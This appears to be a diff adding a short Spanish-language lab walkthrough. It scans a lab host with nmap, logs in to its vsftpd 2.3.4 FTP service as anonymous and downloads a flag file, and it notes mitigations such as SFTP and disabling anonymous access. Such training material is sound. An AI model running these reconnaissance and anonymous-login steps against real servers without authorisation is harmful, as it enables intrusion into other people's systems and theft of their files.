@@ -1,0 +1,32 @@
+******************** Prueba de acceso al servicio ftp ********************
+
+** pc atacante: **
+
+sudo nmap -sV 10.129.27.30  => Escaneo con deteccion de servicios y version.
+
+  21/tcp open  ftp     vsftpd 2.3.4
+
+sudo apt install ftp -y => Instalar el cliente FTP en la maquina atacante.
+
+ftp 10.129.27.30 => Conectarse a la maquina objetivo.
+                           => Deshabilitar FTP: Usar SFTP/FTPS o HTTPS, que cifran
+                                la comunicacion y las credenciales.
+
+  usuario: anonymous => iniciar sesion con credenciales predeterminadas o debiles
+                                        (como la cuenta "anonymous" en FTP).
+                                   => Configuracion Segura: Deshabilitar el acceso anonimo
+                                        o restringir severamente sus permisos
+  password: anon123
+
+** pc objetivo - Post-Explotacion: **
+
+ls -l => Listar archivos
+
+get flag.txt => Descargar la informacion sensible (la "bandera").
+
+bye
+
+** pc atacante: **
+
+cat flag.txt => Leer la bandera
+
